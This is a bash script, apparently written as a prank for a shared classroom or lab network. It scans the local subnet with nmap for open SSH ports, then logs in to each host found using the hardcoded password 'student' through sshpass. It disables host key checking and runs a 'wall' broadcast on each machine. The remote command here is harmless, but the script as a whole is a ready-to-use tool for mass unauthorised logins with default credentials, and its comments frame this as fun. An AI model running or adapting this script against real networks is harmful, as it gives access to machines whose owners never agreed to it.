#!/bin/bash
sudo apt-get install nmap
sudo apt-get install sshpass
####
# Look for all open SSH servers on the local network,
# log in to each found server, and have some fun...
####

# keep original IFS Setting
IFS_BAK=${IFS}

# note the line break between the two quotes, do not add any whitespace, 
# just press enter and close the quotes (escape sequence "\n" for newline won't do)
IFS="
"

# regex pattern for IP addresses
grep_ip="[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"

# Get the interface used for the internet (probably also used for LAN)
# does not open any connection out, it just shows the route needed to get to Google's DNS.
my_interface=$(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ")
show_interface=$(ip addr show "$my_interface" | grep -oP "$grep_ip/[0-9]{1,2}")

# Find all hosts in your subnet open on port 22, grab the IP addresses
IP=$(nmap -p 22 --open "$show_interface" | grep -oP "$grep_ip")

# set IFS back to normal..
IFS=${IFS_BAK}

# Loop over the addresses we found
for a in "${IP[@]}"
do
    echo "student@$a"
    sshpass -p "student" ssh -o StrictHostKeyChecking=no "student@$a" "echo \"Hey, is this thing on?\" | wall -n 2>&1 > /dev/null; exit"
done
